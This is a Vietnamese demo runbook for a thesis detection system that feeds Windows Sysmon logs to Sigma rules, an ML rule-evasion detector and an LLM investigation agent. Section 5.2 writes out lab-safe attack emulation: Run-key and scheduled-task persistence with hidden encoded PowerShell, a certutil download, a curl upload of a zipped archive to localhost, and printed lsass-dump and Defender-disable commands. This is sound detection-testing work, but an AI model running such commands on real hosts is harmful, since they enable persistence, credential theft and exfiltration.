# RED-AI SOC Demo Runbook

Tài liệu này dùng để chạy demo end-to-end cho **Rule Evasion Detection (RED)**:
Windows sinh log Sysmon -> Elastic/Sigma baseline tạo alert -> RED ML phát hiện
biến thể né luật -> AI Agent điều tra và ghi báo cáo vào Elasticsearch.

> Demo chỉ dành cho lab. Script Windows tạo command line, ScriptBlockText và
> registry event đáng ngờ để sinh log, nhưng không tải payload thật và không
> thực thi mã độc từ xa.

## 1. Sơ đồ demo

| Lớp | Input | Logic | Output | Nơi xem |
|---|---|---|---|---|
| Elastic/Sigma baseline | `logs-winlog.*` | Sigma -> Elastic Custom Query rules | Security alerts | `Security -> Rules`, `Security -> Alerts` |
| RED ML | `logs-winlog.*` | Stage 1 score + Stage 2 rule attribution | `red-alerts` | `Discover -> RED Alerts` |
| AI Agent | `red-alerts` | Multi-agent SOC investigation | `ai-investigations` | `Discover -> AI Investigations` |

Điểm cần nhấn khi thuyết trình:

- **Elastic/Sigma** là baseline exact-match, mạnh với mẫu đã biết như
  `-EncodedCommand`.
- **RED** bắt các biến thể gần nghĩa như `-e`, `-Ec`, đổi hoa/thường, thêm tab,
  hoặc rút gọn flag.
- **AI Agent** biến RED alert thành báo cáo điều tra tiếng Việt, mapping MITRE,
  giải thích kỹ thuật evasion và đề xuất Sigma patch/containment.

## 2. Chuẩn bị nhanh

Chạy trên Linux demo box:

```bash
source ~/venvs/rule_evasion_env/bin/activate
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
pip install -r requirements.txt
```

Kiểm tra model RED đã có:

```bash
ls models/process_creation/train_rslt_ensemble_f1.zip
ls models/process_creation/train_rslt_attr_ensemble.zip
ls models/powershell/train_rslt_ensemble_f1.zip
ls models/powershell/train_rslt_attr_ensemble.zip
ls models/registry_event/train_rslt_ensemble_f1.zip
ls models/registry_event/train_rslt_attr_ensemble.zip
```

Chuẩn bị `.env` cho monitor và AI Agent:

```bash
cp .env.example .env
nano .env
```

Các biến tối thiểu:

```text
ES_HOST=http://10.10.20.100:9200
ES_USER=elastic
ES_PASSWORD=your-es-password
ES_RED_INDEX=red-alerts
ES_AI_INDEX=ai-investigations
DEEPSEEK_API_KEY=sk-your-deepseek-key
```

`detect_live.py` không tự đọc `.env`, nên với lệnh RED backfill bên dưới hãy
truyền credential trong URL Elasticsearch, ví dụ
`http://elastic:PASSWORD@10.10.20.100:9200`.

## 3. Elastic/Sigma baseline

Kibana không import trực tiếp Sigma YAML. Nếu chưa có Detection Rules, convert
và import bằng script.

Trong lab hiện tại, các field detection chính đang nằm ở raw Winlog fields:

```text
winlog.event_data.CommandLine
winlog.event_data.Image
winlog.event_data.ParentCommandLine
winlog.event_data.ParentImage
winlog.event_data.ScriptBlockText
winlog.event_data.TargetObject
winlog.event_data.Details
```

Vì vậy khi convert Sigma cần dùng profile `winlog-raw` để rewrite query từ ECS
fields như `process.command_line`, `powershell.file.script_block_text`,
`registry.path` sang raw fields ở trên:

```bash
source ~/venvs/rule_evasion_env/bin/activate
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection

python3 scripts/convert_sigma_to_elastic.py \
  --index-pattern "logs-winlog.*" \
  --field-profile winlog-raw \
  --out /home/luanthanh/data/sigma/elastic_rules/windows_sigma_elastic_winlog_raw.ndjson
```

File NDJSON cho lab raw Sysmon:

```text
/home/luanthanh/data/sigma/elastic_rules/windows_sigma_elastic_winlog_raw.ndjson
```

Import bằng UI:

```text
Kibana -> Security -> Rules -> Import rules
```

Hoặc import bằng API:

```bash
export KIBANA_PASSWORD='your-kibana-password'

python3 scripts/convert_sigma_to_elastic.py \
  --skip-convert \
  --out /home/luanthanh/data/sigma/elastic_rules/windows_sigma_elastic_winlog_raw.ndjson \
  --import-to-kibana \
  --kibana-url http://10.10.20.100:5601 \
  --kibana-user elastic \
  --kibana-password "$KIBANA_PASSWORD" \
  --import-chunk-size 200 \
  --import-timeout 300
```

Hoặc convert và import ngay trong một lệnh:

```bash
python3 scripts/convert_sigma_to_elastic.py \
  --index-pattern "logs-winlog.*" \
  --field-profile winlog-raw \
  --out /home/luanthanh/data/sigma/elastic_rules/windows_sigma_elastic_winlog_raw.ndjson \
  --import-to-kibana \
  --import-chunk-size 200 \
  --import-timeout 300
```

Nếu log đã được ingest chuẩn ECS và có `process.command_line`, bỏ
`--field-profile winlog-raw`.

Sau khi import:

```text
Security -> Rules
```

Tìm rule theo prefix:

```text
SIGMA -
```

Xem alert:

```text
Security -> Alerts
```

Lưu ý quan trọng: Elastic Detection Rules chạy theo lịch, thường kiểu `interval:
5m` và `from: now-5m`. Vì vậy alert baseline có thể xuất hiện muộn hơn raw log
hoặc RED alert.

## 4. Sinh log trên Windows VM

Ba script demo tương ứng ba event type khác nhau:

| Script | Event type RED | Log cần có | Config |
|---|---|---|---|
| `process_creation_scenarios.ps1` | `process_creation` | Sysmon Event ID 1 | `config/process_creation.yaml` |
| `powershell_scenarios.ps1` | `powershell` | PowerShell Event ID 4104 | `config/powershell.yaml` |
| `registry_scenarios.ps1` | `registry_event` | Sysmon Event ID 12/13/14 | `config/registry_event.yaml` |

### 4.1 Process Creation

Đây là demo PowerShell thông qua **process command line**. Copy
`demo/process_creation_scenarios.ps1` sang Windows VM đã bật Sysmon và Elastic Agent,
sau đó mở PowerShell:


```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force

.\process_creation_scenarios.ps1 -Scenario benign
.\process_creation_scenarios.ps1 -Scenario baseline
.\process_creation_scenarios.ps1 -Scenario evasion -SleepSeconds 20
.\process_creation_scenarios.ps1 -Scenario chain
```

Có thể chạy toàn bộ:

```powershell
.\process_creation_scenarios.ps1 -Scenario all -SleepSeconds 20
```

Các kịch bản:

| Scenario | Mục đích |
|---|---|
| `benign` | Sinh hoạt động admin bình thường như `whoami`, `ipconfig`, maintenance script |
| `baseline` | Sinh mẫu PowerShell `-EncodedCommand` đầy đủ, baseline Sigma thường bắt được |
| `evasion` | Sinh biến thể `-e`, `-Ec`, đổi hoa/thường, tab whitespace, `-en` |
| `chain` | Discovery + PowerShell evasion + curl marker dạng exfil |
| `redonly` | Sinh command line bị fragment keyword để RED có thêm ca gần kiểu "rule né được nhưng ML vẫn nghi" |
| `all` | Chạy tất cả kịch bản trên, bao gồm cả `redonly` |

Chạy thử không thực thi process:

```powershell
.\process_creation_scenarios.ps1 -Scenario evasion -DryRun
```

### 4.2 PowerShell ScriptBlock

Đây là demo đúng cho `config/powershell.yaml`, đọc field
`winlog.event_data.ScriptBlockText`. Trên Windows VM cần bật PowerShell Script
Block Logging để có Event ID 4104. Chạy PowerShell bằng quyền Administrator
khi bật policy này:

```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord -Force
```

Copy `demo/powershell_scenarios.ps1` sang Windows VM, rồi chạy:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force

.\powershell_scenarios.ps1 -Scenario benign
.\powershell_scenarios.ps1 -Scenario baseline
.\powershell_scenarios.ps1 -Scenario evasion -SleepSeconds 20
.\powershell_scenarios.ps1 -Scenario chain
```

Script này chỉ ghi/print marker đáng ngờ như `Invoke-Expression`,
`DownloadString`, `IEX`, `FromBase64String` vào ScriptBlockText; không tải hay
execute payload từ xa.

### 4.3 Registry Event

Đây là demo đúng cho `config/registry_event.yaml`, đọc
`winlog.event_data.TargetObject` và `winlog.event_data.Details`. Windows VM cần
Sysmon config có bật registry events, tối thiểu SetValue Event ID 13.

Copy `demo/registry_scenarios.ps1` sang Windows VM, rồi chạy:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force

.\registry_scenarios.ps1 -Scenario benign
.\registry_scenarios.ps1 -Scenario baseline
.\registry_scenarios.ps1 -Scenario evasion -SleepSeconds 20
.\registry_scenarios.ps1 -Scenario chain
```

Script này tạo các value lab-safe dưới `HKCU`, ví dụ Run/RunOnce/Policy Run
marker, rồi tự xóa value sau khi sinh log. Nếu cần giữ lại để kiểm tra bằng
Registry Editor, thêm `-KeepArtifacts`.

## 5. Kịch bản demo VM thật cháy

Kịch bản này dùng Windows VM như một endpoint bị xâm nhập trong lab. Nội dung
trông giống attack chain thật: discovery -> PowerShell encoded command ->
evasion -> registry persistence -> ScriptBlock obfuscation -> outbound marker ->
RED alert -> AI investigation.

Lưu ý khi nói với hội đồng: dù chạy trên VM, demo này vẫn cố ý dùng payload
lab-safe. Các script tạo log giống hành vi độc hại, nhưng không tải payload thật,
không chạy mã độc từ xa, không xóa file hệ thống và không credential dumping.
Lý do là mục tiêu của đề tài là chứng minh năng lực phát hiện và điều tra rule
evasion, không phải phá máy demo.

### 5.1 Câu chuyện trình bày

Tên câu chuyện:

```text
Attacker dùng PowerShell để chạy payload mã hóa, sau đó đổi cách viết để né Sigma,
tạo persistence qua Registry Run key, rồi để lại dấu hiệu outbound/exfil.
```

Mapping dễ nói:

| Pha | MITRE gợi ý | Log chính | Ý nghĩa demo |
|---|---|---|---|
| Discovery | `T1087`, `T1033` | Sysmon Event ID 1 | Attacker hỏi "tôi là ai, domain có gì" |
| PowerShell execution | `T1059.001` | Sysmon Event ID 1, PowerShell 4104 | Chạy PowerShell encoded/scriptblock |
| Rule evasion | `T1027`, `T1059.001` | CommandLine, ScriptBlockText | Đổi `-EncodedCommand` thành `-e`, `-Ec`, backtick, alias |
| Persistence | `T1547.001` | Sysmon Registry Event ID 13 | Ghi Run/RunOnce/Policy Run/IFEO marker |
| Outbound marker | `T1041` hoặc `T1105` | CommandLine/ScriptBlockText | Mô phỏng exfil/C2 bằng marker, không gửi dữ liệu thật |

### 5.2 Bản đỏ hơn: ransomware/loader emulation có kiểm soát

Nếu cô muốn thấy "tấn công" rõ hơn, dùng thêm block này. Nó biến demo từ
PowerShell evasion đơn lẻ thành một mini incident giống loader/ransomware:

```text
Initial execution -> recon -> encoded PowerShell -> persistence -> collection
-> credential-access marker -> defense-evasion marker -> outbound marker.
```

Ranh giới an toàn:

- Có tạo persistence thật trong `HKCU\Run` và Scheduled Task, nhưng payload chỉ
  là `Write-Output` marker.
- Có tạo file giả rồi nén thành `red_collection.zip`, nhưng không lấy dữ liệu
  thật của người dùng.
- Có marker giống LSASS dump và Defender tamper, nhưng chỉ `Write-Output` chuỗi
  lệnh đáng ngờ, không dump credential và không tắt Defender.
- Có `curl` outbound marker tới `127.0.0.1:65535`, thường sẽ fail connection;
  mục tiêu là sinh process/network-looking log, không gửi dữ liệu ra Internet.

Chạy trên Windows VM sau bước baseline/evasion nếu muốn demo "nặng đô" hơn:

```powershell
cd C:\RED-Demo

# 1) Recon thật nhưng không phá gì
whoami /all
net user
net localgroup administrators
ipconfig /all

# 2) Tạo dữ liệu giả rồi nén, mô phỏng collection trước exfil
$DemoRoot = Join-Path $env:TEMP "red_victim_docs"
New-Item -ItemType Directory -Path $DemoRoot -Force | Out-Null
"RED demo invoice data" | Set-Content -Path (Join-Path $DemoRoot "invoice_2026.txt")
"RED demo customer export" | Set-Content -Path (Join-Path $DemoRoot "customers.csv")
Compress-Archive -Path (Join-Path $DemoRoot "*") -DestinationPath (Join-Path $env:TEMP "red_collection.zip") -Force

# 3) Persistence thật nhưng payload chỉ là marker lab-safe
$EncMarker = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFIARQBEACAAZABlAG0AbwAgAG0AYQByAGsAZQByACcA"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateCheck_RED" /t REG_SZ /d "powershell.exe -NoP -W Hidden -e $EncMarker" /f
schtasks /Create /TN "\Microsoft\Windows\REDUpdater" /SC ONLOGON /TR "powershell.exe -NoP -W Hidden -Command Write-Output RED_DEMO_TASK" /F

# 4) Credential-access marker: không dump LSASS, chỉ ghi command đáng ngờ ra log
powershell.exe -NoP -Command '$p=(Get-Process lsass).Id; $m="rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump " + $p + " C:\Users\Public\lsass.dmp full"; Write-Output ("RED_DEMO_CRED_ACCESS_MARKER " + $m)'

# 5) Defense-evasion marker: không tắt Defender, chỉ ghi command đáng ngờ ra log
powershell.exe -NoP -Command '$m="Set-MpPreference -DisableRealtimeMonitoring " + "$" + "true"; Write-Output ("RED_DEMO_DEFENSE_EVASION_MARKER " + $m)'

# 6) LOLBin/download marker: domain invalid, không có payload thật
certutil.exe -urlcache -split -f http://example.invalid/payload.dat "$env:TEMP\payload.dat"

# 7) Exfil marker: gửi tới localhost port đóng, mục tiêu là sinh log curl
curl.exe --max-time 3 -X POST "http://127.0.0.1:65535/upload" -F "file=@$env:TEMP\red_collection.zip"
```

Câu nói khi trình bày block này:

```text
Phần này em không còn demo một command đơn lẻ nữa, mà mô phỏng một incident:
attacker reconnaissance, tạo persistence, gom dữ liệu giả, để lại marker giống
credential dumping, marker giống disable Defender, rồi thử outbound. Các hành vi
nguy hiểm được giữ ở dạng marker để không phá VM, nhưng log sinh ra đủ giống để
SOC/Sigma/RED/AI Agent điều tra như một ca tấn công thật.
```

Query raw log cho block đỏ:

```text
Data view: logs-winlog.*
Query:
  winlog.event_id: 1 and
  (
    winlog.event_data.CommandLine: *RED_DEMO* or
    winlog.event_data.CommandLine: *certutil* or
    winlog.event_data.CommandLine: *curl* or
    winlog.event_data.CommandLine: *schtasks* or
    winlog.event_data.CommandLine: *comsvcs.dll* or
    winlog.event_data.CommandLine: *Set-MpPreference*
  )
Timestamp: event.ingested
```

Query RED process_creation rộng hơn cho block đỏ:

```bash
python3 scripts/detect_live.py \
  --config config/process_creation.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts-attack-demo \
  --event-id 1 \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --since "20m" \
  --until "now" \
  --max-iter 1 \
  --no-state \
  --batch-size 300 \
  --query-string 'winlog.event_data.CommandLine:*RED_DEMO* OR winlog.event_data.CommandLine:*powershell* OR winlog.event_data.CommandLine:*certutil* OR winlog.event_data.CommandLine:*curl* OR winlog.event_data.CommandLine:*schtasks* OR winlog.event_data.CommandLine:*comsvcs.dll* OR process.command_line:*RED_DEMO* OR process.command_line:*powershell* OR process.command_line:*certutil* OR process.command_line:*curl* OR process.command_line:*schtasks* OR process.command_line:*comsvcs.dll*'
```

Nếu dùng AI Agent cho block đỏ:

```bash
export ES_RED_INDEX=red-alerts-attack-demo

python3 -m agent.daemon \
  --interval 5 \
  --score-threshold 0.5 \
  --max-iter 1 \
  --batch-limit 1 \
  --query-string 'red.command_line:*RED_DEMO* OR red.command_line:*powershell* OR red.command_line:*certutil* OR red.command_line:*curl* OR red.command_line:*comsvcs.dll*' \
  --no-state
```

### 5.3 Chuẩn bị trước giờ demo

Trên Windows VM, mở PowerShell Administrator:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord -Force
```

Copy 3 file vào cùng một thư mục trên VM, ví dụ `C:\RED-Demo`:

```text
process_creation_scenarios.ps1
powershell_scenarios.ps1
registry_scenarios.ps1
```

Trên Linux demo box, mở sẵn 3 tab:

Tab 1: monitor live.

```bash
source ~/venvs/rule_evasion_env/bin/activate
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
./demo/monitor.sh 5
```

Tab 2: RED one-shot/backfill, chạy khi cần.

```bash
source ~/venvs/rule_evasion_env/bin/activate
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
```

Tab 3: AI Agent, chạy sau khi có RED alert.

```bash
source ~/venvs/rule_evasion_env/bin/activate
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
source .env
```

### 5.4 Timeline demo 7 phút

#### Bước 1: cho thấy log bình thường không bị thổi phồng

Trên Windows VM:

```powershell
cd C:\RED-Demo
.\process_creation_scenarios.ps1 -Scenario benign
```

Câu nói:

```text
Đầu tiên em tạo activity quản trị bình thường: whoami, ipconfig, script bảo trì.
Nếu hệ thống nào cũng báo động ở bước này thì sẽ gây alert fatigue. RED cần phân
biệt benign với suspicious.
```

Check raw log nhanh trong Kibana Discover:

```text
Data view: logs-winlog.*
Query: winlog.event_id: 1 and winlog.event_data.CommandLine: (*whoami* or *ipconfig* or *daily_backup*)
Timestamp: event.ingested
```

#### Bước 2: baseline Sigma bắt được mẫu đã biết

Trên Windows VM:

```powershell
.\process_creation_scenarios.ps1 -Scenario baseline
```

Câu nói:

```text
Đây là mẫu attacker dùng PowerShell với -EncodedCommand đầy đủ. Đây là pattern
kinh điển, Sigma exact-match thường bắt được. Em dùng bước này để chứng minh
baseline đang hoạt động.
```

Mở Kibana:

```text
Security -> Alerts
KQL gợi ý: host.name: * and (process.command_line: "*EncodedCommand*" or winlog.event_data.CommandLine: "*EncodedCommand*")
```

Nếu Security Alert chưa hiện ngay, nói rõ rule Elastic chạy theo interval; raw
log thường xuất hiện trước alert.

#### Bước 3: attacker đổi cách viết để né rule

Trên Windows VM:

```powershell
.\process_creation_scenarios.ps1 -Scenario evasion -SleepSeconds 5
```

Câu nói:

```text
Bây giờ attacker không đổi mục tiêu, chỉ đổi cách viết: -EncodedCommand thành
-e, -Ec, -en, đổi hoa thường và thêm tab. Nếu rule chỉ exact-match một literal
thì phải liệt kê từng biến thể. Đây là điểm yếu của rule-based detection.
```

Check raw log:

```text
Data view: logs-winlog.*
Query: winlog.event_id: 1 and (winlog.event_data.CommandLine: "* -e *" or winlog.event_data.CommandLine: "* -Ec *" or winlog.event_data.CommandLine: "*-EnCoDeDcOmMaNd*")
Timestamp: event.ingested
```

Chạy RED cho process creation:

```bash
python3 scripts/detect_live.py \
  --config config/process_creation.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts-demo \
  --event-id 1 \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --since "20m" \
  --until "now" \
  --max-iter 1 \
  --no-state \
  --batch-size 200 \
  --query-string 'winlog.event_data.Image:*powershell* OR process.name:*powershell* OR winlog.event_data.CommandLine:*powershell* OR process.command_line:*powershell*'
```

Mở Discover:

```text
Data view: red-alerts-demo
Fields: @timestamp, host.name, red.detection_score, red.top_rule, red.command_line
```

Câu nói:

```text
RED không chỉ hỏi chuỗi có khớp rule hay không. RED normalize command line,
chấm Stage 1 score, rồi Stage 2 quy kết event này giống rule Sigma nào nhất.
Ở đây em chỉ cần nhìn red.detection_score, red.top_rule và red.command_line.
```

#### Bước 4: thêm persistence để demo có cảm giác incident thật

Trên Windows VM:

```powershell
.\registry_scenarios.ps1 -Scenario baseline -KeepArtifacts
.\registry_scenarios.ps1 -Scenario evasion -SleepSeconds 5 -KeepArtifacts
```

Nếu muốn bản đỏ hơn, chạy thêm block ở mục `5.2` ngay sau hai lệnh registry này.
Đây là lúc demo chuyển từ "một event đáng ngờ" thành "một incident chain".

Câu nói:

```text
Sau khi chạy được PowerShell, attacker thường cần persistence. Ở đây em ghi
marker vào HKCU Run, RunOnce, Policies Explorer Run và IFEO Debugger. Đây là
registry persistence trong user hive, có thể xem bằng Registry Editor, và vẫn
là lab-safe vì data chỉ là marker.
```

Check raw registry:

```text
Data view: logs-winlog.*
Query: winlog.event_id: 13 and (winlog.event_data.TargetObject: *RED_Demo* or winlog.event_data.TargetObject: *red_demo*)
Fields: @timestamp, event.ingested, winlog.event_data.TargetObject, winlog.event_data.Details
```

Chạy RED registry:

```bash
python3 scripts/detect_live.py \
  --config config/registry_event.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts-registry-demo \
  --event-id 13 \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --since "20m" \
  --until "now" \
  --max-iter 1 \
  --no-state \
  --batch-size 100 \
  --query-string 'winlog.event_data.TargetObject:*RED_Demo* OR winlog.event_data.TargetObject:*red_demo*'
```

Lưu ý trình bày: với registry RED hiện tại, `red.command_line` thường hiển thị
`TargetObject`; payload/value data nằm ở raw field `winlog.event_data.Details`.

#### Bước 5: ScriptBlock obfuscation để cho thấy thêm một nguồn log khác

Trên Windows VM:

```powershell
.\powershell_scenarios.ps1 -Scenario evasion -SleepSeconds 5
.\powershell_scenarios.ps1 -Scenario chain -SleepSeconds 5
```

Câu nói:

```text
Command line có thể bị rút gọn, còn nội dung PowerShell thật nằm trong Event ID
4104 ScriptBlockText. Script này tạo các biến thể như ghép chuỗi, backtick,
alias IEX và FromBase64String. Đây là nơi Sigma exact-match dễ bị hụt nếu chỉ
tìm literal đầy đủ.
```

Chạy RED PowerShell:

```bash
python3 scripts/detect_live.py \
  --config config/powershell.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts-powershell-demo \
  --event-id 4104 \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --since "20m" \
  --until "now" \
  --max-iter 1 \
  --no-state \
  --batch-size 100 \
  --query-string 'winlog.event_data.ScriptBlockText:*RED_DEMO_PS* OR winlog.event_data.ScriptBlockText:*DownloadString* OR winlog.event_data.ScriptBlockText:*FromBase64String*'
```

#### Bước 6: chạy AI Agent để chốt câu chuyện

Nếu muốn AI điều tra alert process creation:

```bash
export ES_RED_INDEX=red-alerts-demo

python3 -m agent.daemon \
  --interval 5 \
  --score-threshold 0.5 \
  --max-iter 1 \
  --batch-limit 1 \
  --query-string 'red.command_line:*powershell*' \
  --no-state
```

Nếu muốn AI điều tra alert PowerShell ScriptBlock:

```bash
export ES_RED_INDEX=red-alerts-powershell-demo

python3 -m agent.daemon \
  --interval 5 \
  --score-threshold 0.5 \
  --max-iter 1 \
  --batch-limit 1 \
  --query-string 'red.command_line:*RED_DEMO_PS* OR red.command_line:*DownloadString* OR red.command_line:*FromBase64String*' \
  --no-state
```

Mở Kibana:

```text
Discover -> ai-investigations
Fields: timestamp, triage.severity, triage.confidence, red_analyst.evasion_technique,
mitre.primary_technique, response.sigma_patch_yaml, report.summary_vi
```

Câu nói:

```text
Điểm mới của đề tài nằm ở đoạn này: RED alert không dừng ở một score khó hiểu.
AI Agent đọc alert, phân loại severity, giải thích kỹ thuật evasion, map MITRE,
đề xuất Sigma patch và viết báo cáo tiếng Việt cho SOC analyst.
```

### 5.5 Phiên bản ngắn nếu cô chỉ cho 5 phút

Chỉ chạy 3 lệnh trên Windows:

```powershell
.\process_creation_scenarios.ps1 -Scenario benign
.\process_creation_scenarios.ps1 -Scenario baseline
.\process_creation_scenarios.ps1 -Scenario evasion -SleepSeconds 5
```

Sau đó chạy RED process creation và AI Agent. Registry và ScriptBlock để phần
backup khi cô hỏi "hệ thống có hỗ trợ loại log khác không?".

### 5.6 Cleanup sau demo

Nếu đã dùng `-KeepArtifacts`, dọn marker trên Windows VM:

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RED_Demo_Baseline" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RED_Demo_EvasionShortFlag" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateCheck_RED" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "RED_Demo_RunOnce" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "RED_Demo_PolicyRun" -ErrorAction SilentlyContinue
schtasks /Delete /TN "\Microsoft\Windows\REDUpdater" /F
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\red_demo.exe" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\RED_Demo" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\red_demo" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\red_victim_docs" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\red_collection.zip" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\payload.dat" -Force -ErrorAction SilentlyContinue
```

### 5.7 Slide chốt cho kịch bản này

| Demo step | Raw log | Sigma baseline | RED | AI Agent |
|---|---|---|---|---|
| Benign admin | Có | Không nên alert | Không nên score cao | Không cần điều tra |
| Full `-EncodedCommand` | Sysmon EID 1 | Bắt tốt nếu rule enable | Score cao | Giải thích PowerShell encoded |
| `-e`, `-Ec`, case, tab | Sysmon EID 1 | Có thể hụt nếu rule thiếu biến thể | Score cao, có `top_rule` | Giải thích shorthand/case/whitespace evasion |
| Registry Run/RunOnce/IFEO | Sysmon EID 13 | Bắt nếu rule có đúng key/value | Score cao nếu giống persistence rule | Map persistence `T1547.001` |
| ScriptBlock concat/backtick/IEX | PowerShell EID 4104 | Có thể hụt literal | Score cao | Giải thích obfuscation |
| Block đỏ `certutil/curl/schtasks/comsvcs marker` | Sysmon EID 1 + Registry EID 13 | Tùy rule import | RED có thêm context | AI kể thành incident chain |

## 6. RED backfill log Windows

Chạy trên Linux demo box sau khi Windows đã gửi log vào Elasticsearch.

### 6.1 Process Creation

Nếu clock Windows, Linux và ELK đồng bộ, dùng `@timestamp`:

```bash
python3 scripts/detect_live.py \
  --config config/process_creation.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts \
  --threshold 0.5 \
  --method cosine \
  --since "2026-05-15T10:00:00Z" \
  --until "2026-05-15T10:20:00Z" \
  --max-iter 1 \
  --no-state
```

Nếu clock Windows lệch nhưng thời gian ingest trên ELK đúng, dùng
`event.ingested`:

```bash
python3 scripts/detect_live.py \
  --config config/process_creation.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --since "30m" \
  --until "now" \
  --max-iter 1 \
  --no-state
```

Demo sạch chỉ lấy PowerShell qua **process_creation**:

```bash
python3 scripts/detect_live.py \
  --config config/process_creation.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --since "20m" \
  --until "now" \
  --max-iter 1 \
  --no-state \
  --batch-size 100 \
  --query-string 'winlog.event_data.CommandLine:*powershell* OR process.command_line:*powershell*'
```

Chạy liên tục cho demo sạch, chỉ lấy rộng family PowerShell process và ghi vào
index riêng `red-alerts-demo` để không lẫn noise Docker/Chrome/conhost cũ.
Query này chỉ giảm nhiễu nguồn vào, không lọc sẵn `-EncodedCommand`, `-e` hay
các token evasion:

```bash
python3 scripts/detect_live.py \
  --config config/process_creation.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts-demo \
  --threshold 0.5 \
  --method cosine \
  --interval 60 \
  --lookback 5m \
  --reset-state \
  --batch-size 500 \
  --query-string 'winlog.event_data.Image:*powershell* OR process.name:*powershell* OR winlog.event_data.CommandLine:*powershell* OR process.command_line:*powershell*'
```

Trong Discover, tạo data view:

```text
Name: RED Alerts Demo
Index pattern: red-alerts-demo
Timestamp field: @timestamp
```

Ghi nhớ:

- `--no-state` không đọc/ghi `.detect_live_state.json`, phù hợp demo replay.
- `--interval 60` là chu kỳ poll liên tục; nó không quyết định cửa sổ thời gian.
- `--lookback 5m` chỉ dùng lúc daemon khởi động khi state rỗng hoặc reset.
- `--reset-state` giúp demo bắt đầu từ `now-5m`, tránh kẹt state cũ.
- `@timestamp` là thời gian event từ Windows log/agent.
- `event.ingested` là thời gian ingest của Elastic/ingest node.
- `--since 30m` được tính theo clock Linux đang chạy script.
- Lab hiện dùng data stream Windows `logs-winlog.winlog-default`, nên index
  pattern khuyến nghị là `logs-winlog.*`.

Kiểm tra RED alert mới nhất:

```bash
curl -s -u elastic:PASSWORD \
  "http://10.10.20.100:9200/red-alerts/_search?size=10&sort=@timestamp:desc" \
  | jq '.hits.hits[]._source | {ts: ."@timestamp", score: ."red.detection_score", top_rule: ."red.top_rule", cmd: ."red.command_line"}'
```

Kết quả kỳ vọng:

| Variant | RED expected |
|---|---|
| `-EncodedCommand` | `score ~= 1.0` |
| `-e` | `score ~= 1.0` |
| `-Ec` | `score ~= 1.0` |
| tab whitespace + `-e` | `score ~= 1.0` |
| case manipulation | `score ~= 1.0` |

### 6.2 PowerShell ScriptBlock

Backfill Event ID 4104 bằng `config/powershell.yaml`:

```bash
python3 scripts/detect_live.py \
  --config config/powershell.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts-powershell-demo \
  --event-id 4104 \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --since "20m" \
  --until "now" \
  --max-iter 1 \
  --no-state \
  --batch-size 100 \
